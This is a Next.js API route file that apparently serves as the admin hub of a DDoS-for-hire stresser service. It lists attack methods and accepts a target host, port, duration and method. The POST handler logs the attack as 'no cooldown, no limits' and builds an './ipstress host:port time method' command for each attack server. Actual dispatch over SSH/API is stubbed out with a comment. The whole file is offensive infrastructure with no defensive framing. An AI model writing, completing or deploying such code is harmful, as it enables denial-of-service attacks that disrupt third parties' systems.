import { NextRequest, NextResponse } from 'next/server';
import { webDb } from '@/lib/db/web';

export async function GET() {
  const methods = await webDb.methods.findMany({
    select: { id: true, name: true, fullname: true, type: true },
    orderBy: { type: 'asc' },
  });
  return NextResponse.json({ methods });
}

export async function POST(req: NextRequest) {
  const formData = await req.formData();
  const host = formData.get('host') as string;
  const port = formData.get('port') as string;
  const time = formData.get('time') as string;
  const method = formData.get('method') as string;
  const servers = formData.get('servers') as string;

  if (!host || !port || !time || !method) {
    return NextResponse.json({ error: 'All fields are required' }, { status: 400 });
  }

  // Admin hub: no cooldown, no limits
  // Dispatch attack to API servers
  const now = Math.floor(Date.now() / 1000);

  const apiServers = servers === 'all'
    ? await webDb.api.findMany()
    : servers === 'vip'
      ? await webDb.api.findMany({ where: { vip: 1 } })
      : await webDb.api.findMany({ where: { vip: 0 } });

  // Log the attack
  await webDb.logs.create({
    data: {
      user: 'Admin',
      ip: host,
      time: parseInt(time) || 0,
      method,
      postdata: port,
      mode: servers || 'all',
      ratelimit: '0',
      cookie: '0',
      date: now,
      chart: '',
      stopped: 0,
      handler: '',
      origin: 'admin',
    },
  });

  // For each matching API server, dispatch attack command
  const results = [];
  for (const apiServer of apiServers) {
    const cmd = `./ipstress ${host}:${port} ${time} ${method}`;
    results.push({ server: apiServer.name, dispatched: true });

    // In production, this would use SSH/API to trigger the attack
    // For now, we just log it
    console.log(`[Admin Hub] Dispatching to ${apiServer.name}: ${cmd}`);
  }

  return NextResponse.redirect(new URL('/web/admin/hub', req.url));
}